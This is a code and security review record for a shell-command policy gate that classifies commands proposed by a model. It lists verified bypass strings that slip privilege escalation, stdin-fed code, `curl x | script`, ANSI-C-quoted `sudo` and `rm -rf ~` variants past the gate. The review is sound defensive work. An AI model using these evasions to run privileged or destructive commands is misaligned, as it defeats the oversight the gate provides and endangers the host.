- NEEDS-HUMAN [impl] — **Class 6, a quoted compound value of `PROMPT_COMMAND` is read as a subshell, not as array elements.** `src/nl_shell/gate/rules.py:773-781` checks `value.source.startswith("(")`, but `source` still has its quotes. So `declare -a PROMPT_COMMAND='("sudo -i")'` falls through to `self.text(..., "bash")`. That parses `("sudo -i")` as a subshell running a single unknown word, and the result is `session-altering`, not rejected. Bash stores `PROMPT_COMMAND=([0]="sudo -i")` (checked with `declare -p`) and runs it at the next prompt. Brief class 6 says "PROMPT_COMMAND (scalar or array) … however the value is set: … export/declare" (brief.md:108-110). The unquoted form `PROMPT_COMMAND=('sudo -i')` is caught, which shows the gap is quote handling only.
- NEEDS-HUMAN [impl] — **Class 3, a quoted compound assignment to any array runs code and is not read.** Commands `declare`/`typeset`/`local`/`readonly` (row `targets/ubuntu-26.04/commands.toml:1270-1281`): `declare -a x='([$(sudo -i)]=1)'` and `declare -a x='($(sudo -i))'` as proposals are `session-altering` and not rejected. `declare -a x='([0]=$(rm -rf ~))'` is `session-altering`, below destructive. Bash runs the substitution in both the subscript and the value: RAN2, RAN3 and RAN4 all printed, including `local -a x='(…)'` inside a function. The subscript case falls under class 3's "every word bash evaluates … as a subscripted name". The unquoted `declare -a x=('$(sudo -i)')` is rejected, so only the quoted `-a`/`-A` value form gets through. Fix: when the row has `-a`/`-A` and the literal value is `(…)`, read it in bash grammar (subscripts in arithmetic), or apply decision B.
- NEEDS-HUMAN [impl] — **Class 4, run-time command words fed by words the gate cannot see.** `src/nl_shell/gate/rules.py:268-270` (`possible`) and `:286-287` (`word_a`) skip non-literal words. `-c` text whose command word is `"$@"`/`$0`/`$1` is therefore only `mutating` whenever the words that fill it are not literal:
  - `curl x | xargs sh -c '"$@"' _` is `mutating`. In effect it is `curl x | sh`, which is decision B.
  - `bash -c '$1' _ "$(curl x)"` is `mutating`.
  - `bash -c '"$@"' _ "$v"` is `mutating`.
  - `xargs sh -c '$0 -i' < f` is `mutating`.
  - `find . -exec sh -c '"$@"' _ {} \;` is `mutating`. The brief requires that "`find -exec` with a non-literal inner command [is] at least destructive", and the direct `find . -exec {} \;` path does give that (`rules.py:239`).

  Class 4 (brief.md:95-99) says every word that can reach command position goes through the command-word check, including "a non-literal inner command word". A non-literal command word in `-c` text, filled from non-literal or stdin-supplied positionals, should be decision B (at least destructive). The tests only use literal positionals (`_ sudo -i`), which is why they pass.
- NEEDS-HUMAN [impl] — **Decision A / class 4, ANSI-C quoted words are not decoded.** `src/nl_shell/gate/__init__.py:291-292` and `rules.py:286-287`:
  - `$'\x73udo' -i` as a proposal is `mutating` and not rejected.
  - `echo pw | $'\x73udo' -S true` is `mutating` and not rejected. That is the §5 pipe-into-sudo rule bypassed.
  - `foo $'\x73udo'` is `mutating`, but decision A says "after quote removal … names a row with elevates ⇒ privileged, rejected".
  - `$'\x72m' -rf ~` stays `mutating` (still pinned in `tests/test_policy_gate.py` "command word is not a literal").

  `$'…'` is quoting with a fixed value, not an expansion, and the engine already decodes it for options (`sudo $'-S' true` is rejected per the brief). Row 17 (`"r"m -rf ~`) gives the same answer to the same question for double quotes. The human may rule that this belongs to the #196 walker. In that case, retag it [human] and file a follow-up. As written, decision A's "after quote removal" is not met.

## Note (no failing case on this host)

- `targets/ubuntu-26.04/commands.toml:508-518`: the `x-terminal-emulator` row models `-e` as argv (`command = true`), and declares an option set different from the `ptyxis` row (`:520-534`), even though on this host `/usr/bin/x-terminal-emulator` resolves to `/usr/bin/ptyxis`. As a result, `x-terminal-emulator -e 'sudo -i'` is `mutating` with no reason beyond "not allowlisted". Ptyxis has no `-e`, so nothing runs here. On hosts where the alternative is gnome-terminal or xterm, a single `-e` string is split as a command line. Brief class 7 asks for this row "with its text effects". The rule that alias names share the row of the file they point to (class 1) is also not followed here. This is low risk on this target, so I have not tagged it.

## Verdict on the gates

The gating rows (C4, T3) are sound. The reviewer's claim I would not accept is that the property tests "check each rule over the whole table, so a new row or option cannot skip it" (brief.md:5-6). The five bypasses above are all inside classes 3, 4 and 6, and none is caught by a property test. The properties only plug literal test strings into declared row fields. They do not cover syntactic forms outside a row (`[ … ]`, quoted compound values, `$'…'`) or non-literal positionals.

<!-- pdca:leaf-complete -->

### Advisory — security-review

# Security review — issue 197 / ast-policy-gate-command-engine (advisory)

**Attacker-reachable inputs this diff touches:** the model's proposal text (threat model "Where untrusted input enters" item 5), plus typed input and session-state setters that reach `nl_shell.gate.classify` (item 4). Every changed line in `src/nl_shell/gate/rules.py`, `commands.py`, `__init__.py` and `targets/ubuntu-26.04/commands.toml` is on that path.

Method: I ran the patched gate (`$PDCA_TARGET/src`, with the pdca venv's tree-sitter-bash 0.25.1) on about 450 crafted command strings, as proposals, and checked the shell behaviour behind each finding with real bash 5.3.9 on this host. Severity uses the threat model's scale.

## Findings

- NEEDS-HUMAN [impl] — **High** — `src/nl_shell/gate/rules.py:537-539` (`finish`), with the rows at `targets/ubuntu-26.04/commands.toml:740,753,911,954,970`. A row that opens a shell when given no command (`no_command = "opens-shell"` or `opens_shell = true`) is marked "opens an interactive shell" and its stdin is never checked. `stdin_code()` only runs for `no_command = "stdin-code"`. But that shell reads its stdin as code, just like bare `bash`. Who controls it: the model's proposal. What goes wrong: privileged or destructive code fed on stdin is classed `mutating`, and a proposal is not rejected (class 2 / decision B). Reproducer (proposal origin):
  - `unshare <<< 'sudo -i'` → `mutating`, not rejected. `bash <<< 'sudo -i'` is `privileged`, rejected.
  - `chroot / <<< 'sudo -i'`, `sg adm <<< 'sudo -i'`, `newgrp <<< 'sudo -S true'`, `script -q /dev/null <<< 'sudo -i'` → `mutating`, not rejected.
  - `echo 'rm -rf ~' | unshare`, `curl x | script`, `curl x | chroot /` → `mutating`. `curl x | bash` is `destructive` ("runs code the gate cannot read").

  Checked on this host: `unshare <<< 'echo INNER-RAN-via-unshare'` prints `INNER-RAN-via-unshare`, and so does `script -q /dev/null <<< 'echo …'`. Fix: when a mode opens a shell because no command was given, run the same `stdin_code` path with grammar `sh` (literal stdin goes through recursion; a pipe, file or unknown stdin is decision B). Add these cases to `tests/test_gate_commands.py`. The class-2 property test checks that `no_command` is declared, but nothing checks what happens to stdin.

- NEEDS-HUMAN [impl] — **High** — `targets/ubuntu-26.04/commands.toml:1251` (`fc -e`, `role = "script"`). bash does not treat the `-e` value as a file. It builds `"<ename> <tmpfile>"` and runs it as bash text. So `fc -e 'sudo -i'` runs `sudo -i /tmp/bash-fc.*` as root. The gate calls it "runs a file as code" and gives `destructive`, not rejected. It should be `privileged` and rejected, like `bash -c 'sudo -i'`. This is class 3: the field is read in the wrong grammar. Reproducer: `classify("fc -e 'sudo -i'", origin="proposal")` → `destructive`, `rejected=False`. On this host, `bash -c 'set -o history; history -s true; fc -e "echo FC-EDITOR-TEXT-RAN-AS-BASH; :"'` prints the marker, so `;` worked as a bash list separator. Fix: make `-e` a `text:bash` field. The edited file is still decision B, which already applies.

- NEEDS-HUMAN [impl] — **High** — `targets/ubuntu-26.04/commands.toml:28` (`[variables] stored`) and `src/nl_shell/gate/rules.py:700-707` (`write`). An env assignment named `BASH_FUNC_<name>%%` is how bash exports functions. A child bash imports the value as a function definition, so it is stored code (class 6). The table does not list it and nothing matches the pattern. Reproducer (proposal): `env 'BASH_FUNC_ls%%=() { sudo -i; }' bash -c ls` → `mutating`, not rejected. `env 'BASH_FUNC_ls%%=() { rm -rf ~; }' bash -c ls` → `mutating` (Medium on its own). On this host, `env 'BASH_FUNC_ls%%=() { echo FUNC-FROM-ENV-RAN; }' bash -c ls` prints `FUNC-FROM-ENV-RAN`. Fix: treat any `env`/`env -S` assignment whose name matches `BASH_FUNC_*%%` as stored bash code. Class the function body, or use decision B when it can't be read, and make it at least `session-altering`. Add it to the class-6 tests. (The prefix-assignment form, `BASH_FUNC_ls%%=… bash`, is already a parse error and rejected.)

- NEEDS-HUMAN [human] — **High** — `src/nl_shell/gate/rules.py:640-643` (`text`), and `:506` for `eval`. Decision B puts non-literal shell text at `destructive`, even when the literal part names a privileged command or a §5-rejected form. A rejection is never possible this way. Reproducers (proposal), each `destructive`, `rejected=False`:
  - `eval "sudo -S true${x:-}"`
  - `bash -c "sudo -i $x"`
  - `bash -c "export SUDO_ASKPASS=/tmp/x $x"`
  - `sh -c "sudo -A true ${x}"`
  - `trap "sudo -i $x" EXIT`
  - `alias ls="sudo -i $x"`
  - `PROMPT_COMMAND="sudo -i $x"`

  With `x` unset, the first one runs exactly `sudo -S true`. This matches the spec as written (§4.1 decision B: "at least destructive"). It does not match the threat model text this patch adds: "`sudo -S`, `sudo --stdi`, `sudo "$P"` cannot hide", and "Wrappers … don't hide a privileged step". It is also inconsistent with elevating rows, where a non-literal word is rejected (`sudo "$x"` is rejected; `bash -c "sudo -i $x"` is not). A privileged step classed lower is High on the threat model's scale. The worse outcome would be the password reaching captured output through `sudo -S` while passthrough is off (passthrough starts only for the `privileged` class). I did not confirm that: sudo probably turns echo off on a tty stdin. The choice is a spec change to decision B, so it needs a human. Options: (a) for a proposal, reject or raise to `privileged` any non-literal text in a parsed grammar; (b) parse the text with each expansion as an opaque word, so the literal `sudo -S` is seen; (c) accept the gap and write it into the threat model next to the class-7 gap.

## Checked, no finding

- **sudo family and §5 rejections:** short, clustered, attached, long and abbreviated options (`--stdi`, `--std`, `-nS`, `-Su root`, `-C3 -S`, `--prompt=x`), `--` handling, and options hidden behind `env`, `env -S` (`-S'…'`, `-iS`, `--split-string=`), `nice`, `timeout`, `stdbuf`, `setsid`, `flock`, `script -c`, `watch`, `xargs`, `find -exec`, `busybox`, `command`, `builtin`, `exec -a/-c/-l`, `ssh-agent`, `x-terminal-emulator -e`, `ptyxis --`. Pipes, here-strings and here-docs into sudo through wrappers. All were rejected or `privileged` as required. `sudo -hS true` is not rejected, but the table reads `-h` as taking an attached host value (`-hS` is host "S"), which matches sudo's own option parsing.
- **Protected variables (class 5):** `export`, `export -n`, `declare -x/-n/-i`, `typeset`, `local`, `readonly`, `read`, `read -a`, `printf -v`/`-vNAME`, `mapfile`, `readarray`, `getopts`, `wait -p`, `unset`, `let`, nested `bash -c 'export …'`, `builtin`/`command` prefixes. All rejected. `for SUDO_PROMPT in x` and `select SUDO_PROMPT` get through, but the brief puts that out of scope as walker work (brief "Out of scope"), so I am not raising it here.
- **Interpreters and text runners:** python3, perl, tclsh, gjs, gdb (`-ex`, `-x`, `--args sudo`), screen, tmux, at/batch, sg, busybox applets, run-parts, machinectl, systemd-run, run0, login, sulogin. Decision B applies or they are `privileged` as expected. awk/sed/vim/git code paths stay `mutating`, which is the documented class-7 / floor gap.
- **Stored code:** `PS4`/`PROMPT_COMMAND` through `env`, `BASH_ENV`/`ENV`, `complete -C`, `bind -x`, `trap`/`alias` through `builtin`, function bodies. All classed. Readline macros (`bind '"…": "text"'`) stay `session-altering`; the snapshot's `H` (`bind -p/-s/-X`) covers them.
- **Spec §4 destructive list:** every form listed (rm `-R`/`--recur`/glob/non-literal operand, find `-delete`/`-execdir`/`-ok`, dd, mkfs*, wipefs, shred, truncate, fdisk family, chmod/chown `-R`, git clean / reset `--hard` / push `--force`, including `-C`/`-c` globals, systemctl verbs with options first, all `kill -9 -1` spellings) is at least `destructive`.
- **Resource use:** 8 KB inputs of nested wrappers, env-split, arithmetic subscripts and long options all return in 0.03 s or less, as decision C or a normal class. No hang or exception.
- **Fixed load location:** `src/nl_shell/gate/commands.py:59-71,316-338` reads no environment variable, working directory or home directory, and refuses a resolved path outside `TARGETS_ROOT`. The target id comes from the only folder under `targets/` instead of the brief's `"ubuntu-26.04"` constant. That fails closed (decision C) if there are zero or several folders, so it is not a security issue.

## Test coverage

`tests/test_gate_commands.py` does not exercise any of the four findings above: stdin into a shell opened with no command, `fc -e`, `BASH_FUNC_*`, or non-literal text that names sudo. The first three are gaps in the attacker-reachable cases of classes 2, 3 and 6, and the builder can add tests for them along with the fixes.
<!-- pdca:leaf-complete -->

## 6. NEEDS-HUMAN — items the human must clear before sign-off
- [ ] C5 Causal adequacy — Close the class-3 nameref subscript omission: declare -n r='x[$(sudo -i)]'; r=1 can execute uninspected arithmetic, because only the target’s base name is checked; target/src/nl_shell/gate/rules.py:727.
- [ ] T5 Judgment — Confirm path-based merged and closed/rejected prior-art coverage: the brief reports it, but the supplied git history contains only a synthetic base and no independent tracker evidence; brief.md:379.
- [ ] Validation — fitness-to-purpose — Accept the command-table risk and class-7 confirmation-floor exception for this milestone, including the explicit git/tar/ssh code-running gaps; brief.md:402.
- [ ] **Class 3, `[ -v` is not covered.** `src/nl_shell/gate/__init__.py:216-218`: `[ -v 'a[$(sudo -i)]' ]` as a proposal comes out `mutating`, not rejected, with the reason "no simple command to class". `[ -v 'a[$(rm -rf ~)]' ]` is also only `mutating`. The brief's class 3 names `test -v`/`[ -v` explicitly (brief.md:93). `test -v` is handled, but the `[ … ]` form is parsed as a test node with no Invocation, so the engine never sees it. Bash really runs the code: `a=(1); [ -v "a[\$(echo RAN1 >&2)]" ]` prints RAN1. The tests only cover `test -v`, so the property test missed this. Fix: send `[ … ]` through the `test` row, or treat a `[`-test whose operands hold `$`/backtick inside a subscript as decision B. This is the single-bracket builtin. `[[ … ]]` is out of scope and is a different case.
- [ ] **Class 6, a quoted compound value of `PROMPT_COMMAND` is read as a subshell, not as array elements.** `src/nl_shell/gate/rules.py:773-781` checks `value.source.startswith("(")`, but `source` still has its quotes. So `declare -a PROMPT_COMMAND='("sudo -i")'` falls through to `self.text(..., "bash")`. That parses `("sudo -i")` as a subshell running a single unknown word, and the result is `session-altering`, not rejected. Bash stores `PROMPT_COMMAND=([0]="sudo -i")` (checked with `declare -p`) and runs it at the next prompt. Brief class 6 says "PROMPT_COMMAND (scalar or array) … however the value is set: … export/declare" (brief.md:108-110). The unquoted form `PROMPT_COMMAND=('sudo -i')` is caught, which shows the gap is quote handling only.
- [ ] **Class 3, a quoted compound assignment to any array runs code and is not read.** Commands `declare`/`typeset`/`local`/`readonly` (row `targets/ubuntu-26.04/commands.toml:1270-1281`): `declare -a x='([$(sudo -i)]=1)'` and `declare -a x='($(sudo -i))'` as proposals are `session-altering` and not rejected. `declare -a x='([0]=$(rm -rf ~))'` is `session-altering`, below destructive. Bash runs the substitution in both the subscript and the value: RAN2, RAN3 and RAN4 all printed, including `local -a x='(…)'` inside a function. The subscript case falls under class 3's "every word bash evaluates … as a subscripted name". The unquoted `declare -a x=('$(sudo -i)')` is rejected, so only the quoted `-a`/`-A` value form gets through. Fix: when the row has `-a`/`-A` and the literal value is `(…)`, read it in bash grammar (subscripts in arithmetic), or apply decision B.
- [ ] **Class 4, run-time command words fed by words the gate cannot see.** `src/nl_shell/gate/rules.py:268-270` (`possible`) and `:286-287` (`word_a`) skip non-literal words. `-c` text whose command word is `"$@"`/`$0`/`$1` is therefore only `mutating` whenever the words that fill it are not literal:
- [ ] **Decision A / class 4, ANSI-C quoted words are not decoded.** `src/nl_shell/gate/__init__.py:291-292` and `rules.py:286-287`:
- [ ] **High** — `src/nl_shell/gate/rules.py:537-539` (`finish`), with the rows at `targets/ubuntu-26.04/commands.toml:740,753,911,954,970`. A row that opens a shell when given no command (`no_command = "opens-shell"` or `opens_shell = true`) is marked "opens an interactive shell" and its stdin is never checked. `stdin_code()` only runs for `no_command = "stdin-code"`. But that shell reads its stdin as code, just like bare `bash`. Who controls it: the model's proposal. What goes wrong: privileged or destructive code fed on stdin is classed `mutating`, and a proposal is not rejected (class 2 / decision B). Reproducer (proposal origin):
- [ ] **High** — `targets/ubuntu-26.04/commands.toml:1251` (`fc -e`, `role = "script"`). bash does not treat the `-e` value as a file. It builds `"<ename> <tmpfile>"` and runs it as bash text. So `fc -e 'sudo -i'` runs `sudo -i /tmp/bash-fc.*` as root. The gate calls it "runs a file as code" and gives `destructive`, not rejected. It should be `privileged` and rejected, like `bash -c 'sudo -i'`. This is class 3: the field is read in the wrong grammar. Reproducer: `classify("fc -e 'sudo -i'", origin="proposal")` → `destructive`, `rejected=False`. On this host, `bash -c 'set -o history; history -s true; fc -e "echo FC-EDITOR-TEXT-RAN-AS-BASH; :"'` prints the marker, so `;` worked as a bash list separator. Fix: make `-e` a `text:bash` field. The edited file is still decision B, which already applies.
- [ ] **High** — `targets/ubuntu-26.04/commands.toml:28` (`[variables] stored`) and `src/nl_shell/gate/rules.py:700-707` (`write`). An env assignment named `BASH_FUNC_<name>%%` is how bash exports functions. A child bash imports the value as a function definition, so it is stored code (class 6). The table does not list it and nothing matches the pattern. Reproducer (proposal): `env 'BASH_FUNC_ls%%=() { sudo -i; }' bash -c ls` → `mutating`, not rejected. `env 'BASH_FUNC_ls%%=() { rm -rf ~; }' bash -c ls` → `mutating` (Medium on its own). On this host, `env 'BASH_FUNC_ls%%=() { echo FUNC-FROM-ENV-RAN; }' bash -c ls` prints `FUNC-FROM-ENV-RAN`. Fix: treat any `env`/`env -S` assignment whose name matches `BASH_FUNC_*%%` as stored bash code. Class the function body, or use decision B when it can't be read, and make it at least `session-altering`. Add it to the class-6 tests. (The prefix-assignment form, `BASH_FUNC_ls%%=… bash`, is already a parse error and rejected.)
- [ ] **High** — `src/nl_shell/gate/rules.py:640-643` (`text`), and `:506` for `eval`. Decision B puts non-literal shell text at `destructive`, even when the literal part names a privileged command or a §5-rejected form. A rejection is never possible this way. Reproducers (proposal), each `destructive`, `rejected=False`:
- [ ] **The shared work budget is a hidden walker change, and the file list leaves it out.** The brief says "the budget is shared across recursive classifications" and "the test asserts units used stay below that constant". On the target the budget belongs to each `Walker`. `parse.py:516` sets `self.work = 0`, `parse.py:526-528` counts and checks it, and `shell_layer` builds a fresh `Walker` on every call (`parse.py:1077`). So each recursive `shell_layer(text)` starts again at zero. Sharing the budget means changing `parse.py`'s API (passing in a budget or counter). That is #196 walker code, which the brief puts out of scope ("the walker and stdin context (#196)") and which is missing from "Files in scope". The public `classify()` also returns no work count (`Result` at `__init__.py:83-88` has only `cls`, `reasons` and `rejected`). So "asserts units used" is not observable through the public API the brief requires ("Every case goes through the public `nl_shell.gate.classify`"). Fix: put `parse.py` in scope, name the seam (for example a counter argument to `shell_layer`), and state how the test reads units used, or drop that assertion and keep the class floor plus timeout.
- [ ] **Recursion needs the whole `_classify` pipeline, not just `rules`, and the brief describes the `__init__.py` change wrongly.** The brief says `rules.classify` at `:196` "needs the origin and the invocation's assignments for class 6". `Invocation` already carries `assignments` (`parse.py:805`), so only `origin` is missing. The larger problem: classifying literal text "recursively" (decision B, classes 1, 3, 4 and 6) has to rerun redirects, `_assignments` (where the `SUDO_PROMPT` rejection lives, `__init__.py:229-244`), `_shell_rules` and the §1.1 checks on the inner text. All of these live in `gate/__init__.py`, which imports `rules` (`__init__.py:31`). So `rules.py` calling back into the pipeline is either a circular import or a restructure of `__init__.py`, and the brief's "only where a rule needs it" does not cover that. For example, `bash -c 'export SUDO_PROMPT=x'` is rejected only if the inner text goes through `_assignments`. Fix: say explicitly that the recursion entry point is `gate._classify` (or something extracted from it), and widen the `__init__.py` scope line.
- [ ] **Class 2 and class 7 contradict each other on the `git` row.** Class 2: "An option a row does not declare is never read as a harmless flag: the command is at least `destructive`". `git` gets a row (`git clean|reset|push`). Class 7 and the floor group require `git -c core.pager=sh log` to stay `mutating`, "not allowlisted". To pass both, Do has to declare `-c` on the `git` row as an effect-free value option. That is a reviewed row stating that a code-running option is harmless, which breaks the brief's own invariant ("Every part of a command that can run code … gets an explicit fail-closed default … never silently `mutating`"). If `tar` or `ssh` get rows (`--to-command`, `-o`), the same conflict appears. Fix: state that git's global options are declared on purpose as part of the class-7 gap, and mark that rule as the one exception to class 2, or move rows 8/10/11 out of the floor group.
- [ ] **The class 1 coverage property only checks against itself.** "Every name in `inventory.toml` has a `commands.toml` row", but both files are written by Do in the same patch, and `harvest_inventory.py` "is not run by any test". A missing setuid binary or alias in the inventory silently drops it from the property. The checked-in counts ("20 setuid/setgid binaries", `/etc/shells` = `sh, bash, rbash, dash, screen`) are not asserted anywhere. Fix: add a reviewer or gate step that re-runs the harvest script on the host and diffs it against the checked-in `inventory.toml`, or a test that asserts the brief's named members (`sudo.ws`, `sudo-rs`, `su-rs`, `sudoedit-rs`, `pkexec`, `passwd`, `chsh`, `crontab`, `mount`, the five shells) are listed.
- [ ] **The class 2 property case is not defined for wrapper and elevating rows.** "that example plus an undeclared option (`--pdca-undeclared`)" does not say where the option goes. Appended to `sudo true`, `timeout 5 true` or `env x`, it becomes an argument of the inner command, not an undeclared option of the row. The "elevates ⇒ also rejected" property then tests nothing, or tests the inner row. Fix: say the option goes right after the command word (before any operand or inner command), or have each row give an option-position example.
- [ ] **The brief leaves open how the gate knows which target id to load.** The loader "reads `TARGETS_ROOT / <id> / "commands.toml"`" and "takes no path argument", but `classify(command, *, origin, label)` (`__init__.py:147`) has no target, and the brief never says where `<id>` comes from. A hard-coded `ubuntu-26.04` is one choice; detecting it via `os_release`/`targets.load` is another, and it changes what the "missing or invalid `commands.toml`" test can do. That test also needs a way to make the table missing or invalid when no path can be injected and env/cwd are forbidden. The brief does not name the seam (for example monkeypatching a module-level root), so Do will invent one and the reviewer cannot judge it against the "no `os.environ`/`Path.cwd()`" rule. Fix: name the id source and the test seam.
- [ ] **Some regression cases already pass on `main`, so the red leg holds only per group.** On the target, `_declared` (`parse.py:813-828`, called at `:771`) already reads quoted declaration operands after quote removal, so `export "SUDO_PROMPT"=x` and `declare 'SUDO_ASKPASS'=/x` are probably rejected today via `__init__.py:236-237`. The issue's claim that these forms are invisible to child-1 is out of date. The brief's falsifiability claim works per group ("every non-floor group goes red"), which is fine. But nothing stops a group from going red only through its one known-red case while the rest pass on the stub. Fix: note that these cases are pinned against regression, not part of the red-leg claim (as the floor group already does), so Check does not misread a stub pass as a test defect.
- [ ] size backstop — this slice is behaving oversized: patch is 203 KB (threshold 100 KB). Recommend answering `iterate-plan` at sign-off and authoring the split in the re-plan (`pdca split`), rather than `iterate-do`: a slice that is too big yields implementation-shaped findings every round, and splitting authors briefs, which is Plan's beat.

## 7. Proven / not proven
- Proven by which oracle: gates overall = pass (stub oracles).
- Unproven / needs manual run: anything flagged in §6.

## 8. Ready-to-ship attachments
- patch.diff
- tracker-comment.md     (ALWAYS, every tracker item)
- build-notes.md         (builder rationale — for the human, not the reviewer)

## 9. Check sign-off                     ← human completes Check here
- Disposition confirmed / overridden:
- Outcome: iterated-to-Plan
- Iteration delta (if iterating): Slice too big; split it in Plan rather than rebuild. Third round with the same pattern: each build closes the last review's bypass list and the reviewers find a new batch of the same kinds. Patch is 203 KB (2x the 100 KB backstop). v3 still has in-class bypasses: `[ -v 'a[$(…)]' ]`; nameref target subscripts (`declare -n r='x[$(sudo -i)]'; r=1`); quoted compound array values (`declare -a PROMPT_COMMAND='("sudo -i")'`, `declare -a x='($(sudo -i))'`); run-time command words filled by non-literal/stdin positionals (`bash -c '"$@"' _ "$v"`, `xargs sh -c '"$@"' _`); undecoded ANSI-C words (`$'\x73udo' -i`); stdin into shells opened with no command (`unshare <<<'sudo -i'`, `chroot /`, `script`, `sg`, `newgrp`); `fc -e` text read as a file, not bash; `BASH_FUNC_*%%` env assignments. Also a scope drift: target id picked as the sole folder under targets/ instead of the agreed constant "ubuntu-26.04" (commands.py:63-73). Open spec question for the re-plan: should non-literal parsed text that names sudo / a §5 form (`bash -c "sudo -i $x"`, `eval "sudo -S true${x:-}"`) be rejected rather than decision B "destructive"? The threat-model text added in v3 claims it cannot hide. Split with `nl-shell-pdca split 197` so each child owns a small set of classes and its own adversarial review, instead of one bundle carrying all seven.
- By / date: Eduard Ralph / 2026-10-26

## 10. Act candidates (hints for the next Act review)
- Plan advisory: 7 finding(s); brief revised: yes (plan-advisory-*.md)
- (empty is the common case)
